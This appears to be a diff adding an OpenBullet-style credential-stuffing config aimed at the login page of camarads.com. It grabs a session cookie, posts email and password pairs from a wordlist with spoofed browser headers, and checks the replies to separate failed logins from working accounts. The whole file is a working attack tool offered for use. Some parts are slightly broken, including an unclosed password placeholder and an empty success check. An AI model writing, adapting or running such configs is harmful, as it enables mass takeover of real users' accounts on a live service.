@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "camarads",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-20T20:55:26.4625751+02:00",
+  "AdditionalInfo": "",
+  "Author": "Itamai",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "Email",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.camarads.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(PHPSESSID)>" LR "" "" -> VAR "id" 
+
+REQUEST POST "https://www.camarads.com/login" 
+  CONTENT "email=<USER>&pass=<PASS&submit=submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6" 
+  HEADER "cookie: a_campaign=2; _ga=GA1.2.963188927.1557399143; PHPSESSID=<id>; _gid=GA1.2.658428598.1558375320; _gat=1" 
+  HEADER "dnt: 1" 
+  HEADER "referer: https://www.camarads.com/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid user" 
+    KEY "Invalid email" 
+  KEYCHAIN Success OR 
+
